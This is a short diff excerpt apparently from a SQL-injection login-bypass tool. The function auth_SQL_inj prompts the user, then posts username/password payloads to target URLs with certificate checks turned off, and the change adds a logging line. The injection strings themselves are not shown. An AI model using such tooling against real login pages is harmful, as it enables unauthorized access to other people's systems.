@@ -64,6 +64,7 @@ async def auth_SQL_inj(urls):
                         }
                         
                         inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
+                        logging.info(f"Preparing the json payload data to send to the url:{urls},Attack:{attack_type},time:{datetime.now()}")
                         if inp:
                             ##############################################################################
                             ack = requests.post(url=urls, data=params,verify=False) 
